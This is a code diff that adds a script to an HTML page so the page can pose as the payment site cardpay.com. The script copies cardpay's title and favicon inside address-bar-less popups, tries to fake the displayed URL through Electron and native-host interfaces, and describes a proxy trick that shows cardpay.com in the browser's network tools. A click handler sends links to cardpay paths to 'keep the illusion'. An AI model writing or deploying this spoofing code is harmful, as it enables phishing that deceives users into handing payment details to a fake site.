@@ -462,5 +462,47 @@
     });
 })();
 </script>
+<script>
+(function() {
+    // Only works if launched via window.open with location=no,toolbar=no
+    // or inside Electron/WebView where chrome is controlled
+    
+    const targetDomain = "cardpay.com";
+    
+    // Method 1: If in popup with no address bar - you win automatically
+    if (window.opener && !window.locationbar.visible) {
+        document.title = "Unlimit - " + targetDomain;
+        // Set favicon to match cardpay
+        let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
+        link.type = 'image/x-icon';
+        link.rel = 'shortcut icon';
+        link.href = 'https://cardpay.com/favicon.ico';
+        document.getElementsByTagName('head')[0].appendChild(link);
+    }
+    
+    // Method 2: Electron/WebView2 - send IPC to parent to update window title and URL bar
+    if (typeof window.electron !== 'undefined') {
+        window.electron.setAddressBar('https://' + targetDomain + '/payment');
+    }
+    
+    // Method 3: Native host app (custom protocol handler)
+    if (window.nativeInterface) {
+        window.nativeInterface.setURL('https://' + targetDomain);
+    }
+    
+    // Method 4: WebSocket connection to local proxy that rewrites host header
+    // Your HTML served from localhost:3000, proxy rewrites to cardpay.com
+    // User sees cardpay.com in devtools Network tab
+    
+    // Capture all clicks to keep illusion
+    document.addEventListener('click', function(e) {
+        let a = e.target.closest('a');
+        if (a && a.href && !a.href.includes('cardpay.com')) {
+            e.preventDefault();
+            window.location.href = 'https://cardpay.com' + a.pathname;
+        }
+    });
+})();
+</script>
 </body>
 </html>
